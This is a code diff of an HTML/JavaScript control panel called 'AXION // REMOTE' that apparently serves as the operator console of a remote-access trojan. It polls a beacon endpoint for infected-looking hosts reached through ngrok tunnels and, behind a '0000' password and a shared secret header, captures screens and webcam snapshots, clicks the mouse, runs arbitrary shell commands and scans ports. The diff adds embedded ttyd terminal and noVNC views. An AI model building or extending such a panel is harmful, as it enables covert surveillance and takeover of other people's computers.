@@ -6,134 +6,51 @@
   <title>AXION // REMOTE</title>
   <style>
     :root {
-      --bg: #050507;
-      --panel: #0c0c10;
-      --border: #1a1a22;
-      --accent: #00ff9d;
-      --text: #c8c8d0;
-      --dim: #5a5a68;
-      --danger: #ff3b5c;
+      --bg: #050507; --panel: #0c0c10; --border: #1a1a22;
+      --accent: #00ff9d; --text: #c8c8d0; --dim: #5a5a68; --danger: #ff3b5c;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: "SF Mono", "Fira Code", "Consolas", monospace;
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      font-size: 13px;
+      background: var(--bg); color: var(--text); min-height: 100vh; font-size: 13px;
     }
     header {
-      padding: 14px 16px;
-      border-bottom: 1px solid var(--border);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+      padding: 14px 16px; border-bottom: 1px solid var(--border);
+      display: flex; justify-content: space-between; align-items: center;
     }
     header h1 { font-size: 14px; font-weight: 600; letter-spacing: 0.12em; color: var(--accent); }
     header span { color: var(--dim); font-size: 11px; }
-    .wrap { max-width: 720px; margin: 0 auto; padding: 12px; }
-    .panel {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 12px;
-      margin-bottom: 12px;
-    }
-    .panel h2 {
-      font-size: 11px;
-      color: var(--dim);
-      letter-spacing: 0.1em;
-      margin-bottom: 10px;
-      text-transform: uppercase;
-    }
+    .wrap { max-width: 900px; margin: 0 auto; padding: 12px; }
+    .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 12px; margin-bottom: 12px; }
+    .panel h2 { font-size: 11px; color: var(--dim); letter-spacing: 0.1em; margin-bottom: 10px; text-transform: uppercase; }
     input, textarea {
-      width: 100%;
-      background: #08080c;
-      border: 1px solid var(--border);
-      color: var(--text);
-      padding: 8px 10px;
-      border-radius: 4px;
-      font-family: inherit;
-      font-size: 12px;
-      margin-bottom: 8px;
+      width: 100%; background: #08080c; border: 1px solid var(--border); color: var(--text);
+      padding: 8px 10px; border-radius: 4px; font-family: inherit; font-size: 12px; margin-bottom: 8px;
     }
-    input:focus, textarea:focus { outline: none; border-color: var(--accent); }
     button {
-      background: transparent;
-      border: 1px solid var(--accent);
-      color: var(--accent);
-      padding: 7px 12px;
-      border-radius: 4px;
-      font-family: inherit;
-      font-size: 11px;
-      cursor: pointer;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
+      background: transparent; border: 1px solid var(--accent); color: var(--accent);
+      padding: 7px 12px; border-radius: 4px; font-family: inherit; font-size: 11px;
+      cursor: pointer; letter-spacing: 0.06em; text-transform: uppercase;
     }
-    button:active { background: rgba(0,255,157,0.1); }
     button.ghost { border-color: var(--border); color: var(--dim); }
     .row { display: flex; gap: 6px; flex-wrap: wrap; }
     .row button { flex: 1; min-width: 70px; }
-    #screen, #cam {
-      width: 100%;
-      background: #000;
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      min-height: 180px;
-      object-fit: contain;
-      touch-action: none;
-      cursor: crosshair;
-    }
-    .machine {
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      padding: 10px;
-      margin-bottom: 8px;
-      cursor: pointer;
-    }
+    #screen, #cam { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 4px; min-height: 180px; object-fit: contain; touch-action: none; cursor: crosshair; }
+    iframe.view { width: 100%; height: 420px; border: 1px solid var(--border); border-radius: 4px; background: #000; }
+    .machine { border: 1px solid var(--border); border-radius: 4px; padding: 10px; margin-bottom: 8px; cursor: pointer; }
     .machine:hover, .machine.active { border-color: var(--accent); }
     .machine .name { color: var(--accent); font-weight: 600; }
     .machine .meta { color: var(--dim); font-size: 11px; margin-top: 3px; word-break: break-all; }
-    pre {
-      background: #08080c;
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      padding: 8px;
-      font-size: 11px;
-      max-height: 180px;
-      overflow: auto;
-      white-space: pre-wrap;
-      color: #8a8a98;
-    }
-    .tabs { display: flex; gap: 4px; margin-bottom: 10px; }
-    .tab {
-      flex: 1;
-      text-align: center;
-      padding: 7px;
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      color: var(--dim);
-      cursor: pointer;
-      font-size: 11px;
-    }
+    pre { background: #08080c; border: 1px solid var(--border); border-radius: 4px; padding: 8px; font-size: 11px; max-height: 220px; overflow: auto; white-space: pre-wrap; color: #8a8a98; }
+    .tabs { display: flex; gap: 4px; margin-bottom: 10px; flex-wrap: wrap; }
+    .tab { flex: 1; min-width: 70px; text-align: center; padding: 7px; border: 1px solid var(--border); border-radius: 4px; color: var(--dim); cursor: pointer; font-size: 11px; }
     .tab.active { border-color: var(--accent); color: var(--accent); }
     .hidden { display: none; }
     .log { font-size: 11px; color: var(--dim); max-height: 90px; overflow-y: auto; margin-top: 8px; }
-    .log div { margin-bottom: 2px; }
-    #lock {
-      position: fixed; inset: 0; background: #050507;
-      display: flex; align-items: center; justify-content: center;
-      z-index: 99;
-    }
-    #lock .box {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 24px;
-      width: 280px;
-      text-align: center;
-    }
+    #lock { position: fixed; inset: 0; background: #050507; display: flex; align-items: center; justify-content: center; z-index: 99; }
+    #lock .box { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 24px; width: 280px; text-align: center; }
     #lock h2 { color: var(--accent); letter-spacing: 0.15em; margin-bottom: 16px; font-size: 13px; }
+    .port { display: inline-block; border: 1px solid var(--accent); color: var(--accent); padding: 4px 8px; margin: 3px; border-radius: 4px; font-size: 11px; }
   </style>
 </head>
 <body>
@@ -145,7 +62,6 @@
       <div id="pwErr" style="color:var(--danger);font-size:11px;margin-top:8px;display:none">wrong</div>
     </div>
   </div>
-
   <header>
     <h1>AXION // REMOTE</h1>
     <span id="clock">--:--:--</span>
@@ -161,15 +77,15 @@
     </div>
     <div class="panel">
       <h2>detected hosts</h2>
-      <div id="machines">
-        <div style="color:var(--dim);font-size:11px">scanning for signals...</div>
-      </div>
+      <div id="machines"><div style="color:var(--dim);font-size:11px">scanning for signals...</div></div>
     </div>
     <div id="control" class="hidden">
       <div class="tabs">
         <div class="tab active" data-t="screen">Desktop</div>
+        <div class="tab" data-t="term">Terminal</div>
+        <div class="tab" data-t="vnc">noVNC</div>
+        <div class="tab" data-t="ports">Ports</div>
         <div class="tab" data-t="cam">Camera</div>
-        <div class="tab" data-t="input">Input</div>
         <div class="tab" data-t="sys">Shell</div>
       </div>
       <div id="p-screen" class="panel">
@@ -180,26 +96,29 @@
           <button class="ghost" id="autoBtn" onclick="toggleAuto()">Live Off</button>
         </div>
       </div>
+      <div id="p-term" class="panel hidden">
+        <div class="row" style="margin-bottom:8px">
+          <button onclick="openTerm()">Open tab</button>
+        </div>
+        <iframe id="termFrame" class="view" title="ttyd"></iframe>
+      </div>
+      <div id="p-vnc" class="panel hidden">
+        <div class="row" style="margin-bottom:8px">
+          <button onclick="openVnc()">Open tab</button>
+        </div>
+        <iframe id="vncFrame" class="view" title="noVNC"></iframe>
+      </div>
+      <div id="p-ports" class="panel hidden">
+        <button onclick="scanPorts()">Scan open ports</button>
+        <div id="portBox" style="margin-top:10px;color:var(--dim)">click scan after the host is connected</div>
+      </div>
       <div id="p-cam" class="panel hidden">
         <img id="cam" />
-        <div class="row" style="margin-top:8px">
-          <button onclick="grabCam()">Snapshot</button>
-        </div>
-      </div>
-      <div id="p-input" class="panel hidden">
-        <input id="typeBox" placeholder="type text to send..." />
-        <button onclick="sendText()">Send Text</button>
-        <div class="row">
-          <button class="ghost" onclick="key('enter')">Enter</button>
-          <button class="ghost" onclick="key('backspace')">Bksp</button>
-          <button class="ghost" onclick="key('tab')">Tab</button>
-          <button class="ghost" onclick="key('escape')">Esc</button>
-        </div>
+        <div class="row" style="margin-top:8px"><button onclick="grabCam()">Snapshot</button></div>
       </div>
       <div id="p-sys" class="panel hidden">
         <div class="row">
           <button onclick="getInfo()">Info</button>
-          <button onclick="getProcs()">Tasks</button>
         </div>
         <textarea id="ps" rows="2" placeholder="command (powershell on Windows, bash on Mac/Linux)"></textarea>
         <button onclick="runPS()">Execute</button>
@@ -211,39 +130,25 @@
     const BEACON = "/api/beacon";
     const PAGE_PASS = "0000";
     const SECRET = "axion-remote-2026";
+    let base = null, termUrl = "", vncUrl = "", autoT = null, machines = {}, unlocked = false, deskW = 1920, deskH = 1080;
 
-    let base = null;
-    let autoT = null;
-    let machines = {};
-    let unlocked = false;
-    let deskW = 1920;
-    let deskH = 1080;
-
-    setInterval(() => {
-      document.getElementById("clock").textContent = new Date().toLocaleTimeString();
-    }, 1000);
+    setInterval(() => { document.getElementById("clock").textContent = new Date().toLocaleTimeString(); }, 1000);
 
     function tryUnlock() {
-      const v = document.getElementById("pw").value;
-      if (v === PAGE_PASS) {
+      if (document.getElementById("pw").value === PAGE_PASS) {
         unlocked = true;
         document.getElementById("lock").style.display = "none";
         log("access granted");
         pollBeacon();
         setInterval(pollBeacon, 10000);
-      } else {
-        document.getElementById("pwErr").style.display = "block";
-      }
+      } else document.getElementById("pwErr").style.display = "block";
     }
-    document.getElementById("pw").addEventListener("keydown", e => {
-      if (e.key === "Enter") tryUnlock();
-    });
+    document.getElementById("pw").addEventListener("keydown", e => { if (e.key === "Enter") tryUnlock(); });
 
     function log(msg) {
-      const el = document.getElementById("log");
       const d = document.createElement("div");
       d.textContent = "> " + msg;
-      el.prepend(d);
+      document.getElementById("log").prepend(d);
     }
 
     document.querySelectorAll(".tab").forEach(t => {
@@ -256,15 +161,10 @@
     });
 
     async function api(path, method="GET", body=null) {
-      if (!base) throw new Error("no target");
+      if (!base) throw new Error("no api url");
       const opts = {
         method,
-        headers: {
-          "X-Secret": SECRET,
-          "Content-Type": "application/json",
-          "ngrok-skip-browser-warning": "true",
-          "User-Agent": "AxionRemote"
-        }
+        headers: { "X-Secret": SECRET, "Content-Type": "application/json", "ngrok-skip-browser-warning": "true" }
       };
       if (body) opts.body = JSON.stringify(body);
       const r = await fetch(base + path, opts);
@@ -272,24 +172,22 @@
       return r.json();
     }
 
-    function setTarget(url) {
-      if (!url) {
-        log("this host has no public url yet — wait for ngrok in the python window");
-        return;
-      }
-      base = url.startsWith("http") ? url.replace(/\/$/, "") : "https://" + url;
+    function setTarget(apiUrl, tUrl, vUrl) {
+      base = apiUrl ? apiUrl.replace(/\/$/, "") : "";
+      termUrl = tUrl || "";
+      vncUrl = vUrl || "";
       document.getElementById("control").classList.remove("hidden");
-      log("linked → " + base);
-      grabScreen();
-      if (!autoT) toggleAuto();
+      log("linked api=" + (base || "(none)") + " term=" + (termUrl || "(none)"));
+      if (termUrl) document.getElementById("termFrame").src = termUrl;
+      if (vncUrl) document.getElementById("vncFrame").src = vncUrl.replace(/\/$/, "") + "/vnc.html?autoconnect=1&resize=remote";
+      if (base) { grabScreen(); if (!autoT) toggleAuto(); }
     }
     window.setTarget = setTarget;
 
-    function clearHosts() {
-      machines = {};
-      renderMachines();
-      log("cleared");
-    }
+    function openTerm() { if (termUrl) window.open(termUrl, "_blank"); else log("no ttyd url yet"); }
+    function openVnc() { if (vncUrl) window.open(vncUrl.replace(/\/$/, "") + "/vnc.html?autoconnect=1", "_blank"); else log("no noVNC url yet"); }
+
+    function clearHosts() { machines = {}; renderMachines(); log("cleared"); }
 
     function renderMachines() {
       const box = document.getElementById("machines");
@@ -300,11 +198,12 @@
       }
       box.innerHTML = ids.map(id => {
         const m = machines[id];
-        const target = m.public_url || "";
-        const ready = target ? "LIVE" : "no tunnel";
-        return `<div class="machine" onclick="setTarget('${target}')">
+        const apiU = m.api_url || m.public_url || "";
+        const tU = m.term_url || "";
+        const vU = m.vnc_url || "";
+        return `<div class="machine" onclick="setTarget('${apiU}','${tU}','${vU}')">
           <div class="name">${m.hostname || id} · ${m.os || "?"}</div>
-          <div class="meta">${m.user || "?"} · ${m.local_ip || "?"} · ${ready}<br>${target || "(waiting ngrok)"}</div>
+          <div class="meta">${m.user || "?"} · ${m.local_ip || "?"}<br>term ${tU || "(waiting)"}<br>api ${apiU || "(waiting)"}</div>
         </div>`;
       }).join("");
     }
@@ -313,37 +212,25 @@
       if (!data || !data.id) return;
       machines[data.id] = data;
       renderMachines();
-      log("signal · " + (data.hostname || data.id) + (data.public_url ? " · tunneled" : " · no url"));
+      log("signal · " + (data.hostname || data.id));
     }
 
     async function pollBeacon() {
       if (!unlocked) return;
       try {
         const r = await fetch(BEACON);
-        if (!r.ok) throw new Error("beacon " + r.status);
         const j = await r.json();
-        const list = j.hosts || [];
-        let added = 0;
-        for (const body of list) {
-          if (body && body.id) {
-            if (!machines[body.id] || machines[body.id].ts !== body.ts) {
-              addMachine(body);
-              added++;
-            }
-          }
+        for (const body of (j.hosts || [])) {
+          if (body && body.id && (!machines[body.id] || machines[body.id].ts !== body.ts)) addMachine(body);
         }
-        if (added) log("updated hosts: " + added);
-        else log("scan ok · " + Object.keys(machines).length + " host(s)");
-      } catch (e) {
-        log("beacon fail · " + e.message);
-      }
+        log("scan ok · " + Object.keys(machines).length + " host(s)");
+      } catch (e) { log("beacon fail · " + e.message); }
     }
 
     async function grabScreen() {
       try {
         const j = await api("/screen");
-        if (j.w) deskW = j.w;
-        if (j.h) deskH = j.h;
+        if (j.w) deskW = j.w; if (j.h) deskH = j.h;
         document.getElementById("deskMeta").textContent = deskW + "x" + deskH + " · tap to click";
         if (j.img) document.getElementById("screen").src = "data:image/jpeg;base64," + j.img;
       } catch (e) { log("screen fail · " + e.message); }
@@ -365,41 +252,33 @@
       const r = e.target.getBoundingClientRect();
       const x = Math.round(((e.clientX - r.left) / r.width) * deskW);
       const y = Math.round(((e.clientY - r.top) / r.height) * deskH);
-      try {
-        await api("/mouse", "POST", { action: "click", x, y, button: e.button === 2 ? "right" : "left" });
-        setTimeout(grabScreen, 250);
-      } catch (err) { log("click fail · " + err.message); }
+      try { await api("/mouse", "POST", { action: "click", x, y, button: e.button === 2 ? "right" : "left" }); setTimeout(grabScreen, 250); }
+      catch (err) { log("click fail · " + err.message); }
     });
-    async function sendText() {
-      const t = document.getElementById("typeBox").value;
-      if (!t) return;
-      try { await api("/keyboard", "POST", { text: t }); log("text sent"); }
-      catch (e) { log("fail · " + e.message); }
-    }
-    async function key(k) {
-      try { await api("/keyboard", "POST", { key: k }); }
-      catch (e) { log("fail · " + e.message); }
-    }
     async function getInfo() {
-      try {
-        const j = await api("/info");
-        document.getElementById("out").textContent = JSON.stringify(j, null, 2);
-      } catch (e) { log("fail · " + e.message); }
-    }
-    async function getProcs() {
-      try {
-        const j = await api("/processes");
-        document.getElementById("out").textContent = (j.list || []).join("\n");
-      } catch (e) { log("fail · " + e.message); }
+      try { document.getElementById("out").textContent = JSON.stringify(await api("/info"), null, 2); }
+      catch (e) { log("fail · " + e.message); }
     }
     async function runPS() {
       const cmd = document.getElementById("ps").value.trim();
       if (!cmd) return;
       try {
         const j = await api("/shell", "POST", { cmd });
-        let o = (j.stdout || "") + (j.stderr ? "\n" + j.stderr : "") + (j.error || "");
-        document.getElementById("out").textContent = o || "(empty)";
+        document.getElementById("out").textContent = (j.stdout || "") + (j.stderr ? "\n" + j.stderr : "") + (j.error || "") || "(empty)";
       } catch (e) { log("fail · " + e.message); }
+    }
+    async function scanPorts() {
+      const box = document.getElementById("portBox");
+      box.textContent = "scanning this device...";
+      try {
+        const j = await api("/ports");
+        const ports = j.open || [];
+        if (!ports.length) { box.textContent = "no scanned ports open"; return; }
+        box.innerHTML = ports.map(p => '<span class="port">' + p + "</span>").join("") +
+          '<div style="margin-top:8px;color:var(--dim)">host ' + (j.host || "127.0.0.1") + " · " + (j.os || "") + "</div>";
+      } catch (e) {
+        box.textContent = "scan fail · " + e.message;
+      }
     }
   </script>
 </body>
